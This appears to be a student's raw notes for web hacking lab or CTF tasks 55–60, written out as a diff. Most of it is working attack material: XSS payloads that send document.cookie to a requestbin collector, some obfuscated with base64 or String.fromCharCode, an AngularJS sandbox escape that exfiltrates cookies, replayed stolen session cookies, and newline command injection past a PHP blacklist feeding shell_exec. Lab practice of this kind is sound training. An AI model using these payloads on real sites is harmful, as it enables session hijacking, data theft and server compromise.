@@ -1,0 +1,161 @@
+XSS
+<script>alert('1')</script>
+requestbin.jumio.com
+
+55
+
+ffuf -u http://185.231.246.136:8022/c6699f30299e9eb31b7363f7b3271f39/?FUZZ=aaa -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -c -fs 389 
+
+
+http://185.231.246.136:8022/c6699f30299e9eb31b7363f7b3271f39/?test=<script>document.location="https://requestbin.jumio.com/168004w1?c="+document.cookie;</script>
+
+http://185.231.246.136:8022/c6699f30299e9eb31b7363f7b3271f39/?test=%3Cscript%3Edocument.location%3D%22https%3A%2F%2Frequestbin.jumio.com%2F168004w1%3Fc%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E
+
+
+56
+
+<script>eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vcmVxdWVzdGJpbi5qdW1pby5jb20vMTY4MDA0dzE/Yz0iK2RvY3VtZW50LmNvb2tpZTs='))</script>
+
+57
+
+/8d1df2d1246ff91f76433f3b33c6c2f5/check.php
+
+
+https://www.invicti.com/blog/web-security/xss-filter-evasion/
+<body onload="eval(atob('YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk='))">
+
+<body onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vcmVxdWVzdGJpbi5qdW1pby5jb20vMTY4MDA0dzE/Yz0iK2RvY3VtZW50LmNvb2tpZTs='))">
+
+1.
+
+<img src=a onerror=setInterval(String['fromCharCode'](100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,105,110,46,106,117,109,105,111,46,99,111,109,47,49,54,56,48,48,52,119,49,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>
+
+2.
+
+<body onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vcmVxdWVzdGJpbi5qdW1pby5jb20vMTY4MDA0dzE/Yz0iK2RvY3VtZW50LmNvb2tpZTs='))">
+
+3. 
+<object onerror=eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,105,110,46,106,117,109,105,111,46,99,111,109,47,49,54,56,48,48,52,119,49,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>
+
+http://185.231.246.136:8027/0d7ef8ac49f36da8f69b310522ebbd41/?test=%3Cobject%20onerror%3Deval%28String.fromCharCode%28100%2C111%2C99%2C117%2C109%2C101%2C110%2C116%2C46%2C108%2C111%2C99%2C97%2C116%2C105%2C111%2C110%2C61%2C34%2C104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C114%2C101%2C113%2C117%2C101%2C115%2C116%2C98%2C105%2C110%2C46%2C106%2C117%2C109%2C105%2C111%2C46%2C99%2C111%2C109%2C47%2C49%2C54%2C56%2C48%2C48%2C52%2C119%2C49%2C63%2C99%2C61%2C34%2C43%2C100%2C111%2C99%2C117%2C109%2C101%2C110%2C116%2C46%2C99%2C111%2C111%2C107%2C105%2C101%2C59%29%29%3E
+
+aHR0cDovLzE4NS4yMzEuMjQ2LjEzNjo4MDI3LzBkN2VmOGFjNDlmMzZkYThmNjliMzEwNTIyZWJiZDQxLz90ZXN0PSUzQ29iamVjdCUyMG9uZXJyb3IlM0RldmFsJTI4U3RyaW5nLmZyb21DaGFyQ29kZSUyODEwMCUyQzExMSUyQzk5JTJDMTE3JTJDMTA5JTJDMTAxJTJDMTEwJTJDMTE2JTJDNDYlMkMxMDglMkMxMTElMkM5OSUyQzk3JTJDMTE2JTJDMTA1JTJDMTExJTJDMTEwJTJDNjElMkMzNCUyQzEwNCUyQzExNiUyQzExNiUyQzExMiUyQzExNSUyQzU4JTJDNDclMkM0NyUyQzExNCUyQzEwMSUyQzExMyUyQzExNyUyQzEwMSUyQzExNSUyQzExNiUyQzk4JTJDMTA1JTJDMTEwJTJDNDYlMkMxMDYlMkMxMTclMkMxMDklMkMxMDUlMkMxMTElMkM0NiUyQzk5JTJDMTExJTJDMTA5JTJDNDclMkM0OSUyQzU0JTJDNTYlMkM0OCUyQzQ4JTJDNTIlMkMxMTklMkM0OSUyQzYzJTJDOTklMkM2MSUyQzM0JTJDNDMlMkMxMDAlMkMxMTElMkM5OSUyQzExNyUyQzEwOSUyQzEwMSUyQzExMCUyQzExNiUyQzQ2JTJDOTklMkMxMTElMkMxMTElMkMxMDclMkMxMDUlMkMxMDElMkM1OSUyOSUyOSUzRQ==
+
+
+
+58
+admin
+sent 
+https://requestbin.jumio.com/168004w1?
+to 
+http://185.231.246.136:8031/dUr4chK1/vincent.php
+
+got:
+Cookie: id=1; hash=8c053e8f99834fcab813b4abc1a16d40
+
+registered and then changed cookir in burp request
+GET /8d1df2d1246ff91f76433f3b33c6c2f5/check.php HTTP/1.1
+
+59
+
+http://185.231.246.136:8029/b010f8670630ab5da728493bbca7246b/ 
+/b010f8670630ab5da728493bbca7246b/index.php
+/b010f8670630ab5da728493bbca7246b/robots.txt
+
+Disallow: 4da37d5339bd11ac5d7920cacf2a6355.php
+http://185.231.246.136:8029/b010f8670630ab5da728493bbca7246b/4da37d5339bd11ac5d7920cacf2a6355.php
+
+send this: 
+
+<object onerror=eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,105,110,46,106,117,109,105,111,46,99,111,109,47,49,54,56,48,48,52,119,49,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>
+
+//Mary, pls... Dont forget! Each 2 minuts check this!
+
+return this: 
+
+Access=RmFsc2U=; NotBad=for_the_future_IknowREALkey; This_is_for_you=Cookie_is_kronKey
+
+send to login page: 
+
+Cookie: kronKey
+
+received:
+
+Location: http://185.231.246.136:8029/b010f8670630ab5da728493bbca7246b/19224125df5bc83dbda1b7219b231c8d.php
+
+just send Cookie: NotBad=for_the_future_IknowREALkey
+
+not used:
+
+/b010f8670630ab5da728493bbca7246b/version.txt   
+1.4.7
+
+http://185.231.246.136:8029/b010f8670630ab5da728493bbca7246b/docs/js/
+ http://185.231.246.136/b010f8670630ab5da728493bbca7246b/docs/components/
+ http://185.231.246.136/b010f8670630ab5da728493bbca7246b/docs/css/
+http://185.231.246.136/b010f8670630ab5da728493bbca7246b/docs/examples/
+http://185.231.246.136/b010f8670630ab5da728493bbca7246b/docs/img/
+/b010f8670630ab5da728493bbca7246b/docs/index.html
+AngularJS API Docs
+
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("https://requestbin.jumio.com/1cuyag71?c="+document.cookie)//');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("https://requestbin.jumio.com/1cuyag71?c="+document.cookie)//');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("https://requestbin.jumio.com/1cuyag71?c="+document.getElementsByName("key"))//');}} 
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(document.getElementById("secret key"))//');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } }; alert(document.getElementsByTagName("a")[1].innerHTML)//');}}')
+
+task 60
+
+fonts
+js
+css
+images
+
+http://185.231.246.136:8030/f7f72eb4db6f41d90bebbb258ca1aac8/index.php
+http://185.231.246.136:8030/f7f72eb4db6f41d90bebbb258ca1aac8/contact.php
+short-codes.php
+icons.php
+single.php
+entertainment.php
+breaking.php
+events.php
+
+sendbacktopage="><svg onload=confirm(/OPEN/)>
+
+entertainment.php id shadow
+
+// sourceURL=pen.js
+
+
+https://185.231.245.55/3d7721e2d07ad4a12f2fe8960d7fef36/catchCookie.php?cookie=__utmz=169121441.1690156023.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);%20_ga=GA1.1.1245297620.1690156023;%20_gid=GA1.1.2104148855.1690156057;%20__utma=169121441.1245297620.1690156023.1690173237.1690231255.4
+
+
+if(isset($_GET['work'])){
+		$work = $_GET['work'];
+		echo "<pre>Work panel:</pre>";
+		$blacklist = array(
+							'&' => '',
+							';' => '',
+							'ls' => '',
+							'pwd' => '',
+							'cat' => '',
+							'wget' => '',
+							'ns' => '',
+							'|' => ''
+							);
+		$work = str_replace(array_keys($blacklist), $blacklist, $work);
+		$cmd = shell_exec('cat '.$work);
+		echo '<textarea cols="120" rows="30">'.$cmd.'\
+
+http://185.231.246.136:8200/21d9ef771bca17e85db5ca403a6a96f2/myProject/index.php?work=index.php
+http://185.231.246.136:8200/21d9ef771bca17e85db5ca403a6a96f2/js/myanalitics.js
+
+http://185.231.246.136:8200/21d9ef771bca17e85db5ca403a6a96f2/myProject/index.php?work=%0Adir%20-l
+
+http://185.231.246.136:8200/21d9ef771bca17e85db5ca403a6a96f2/myProject/index.php?work=%0Adir%20-l%20../../../../../
+
+http://185.231.246.136:8200/21d9ef771bca17e85db5ca403a6a96f2/myProject/index.php?work=%0Agrep%20-rnF%20%22..%22%20-e%20%22cdb{%22
+
+
+
+
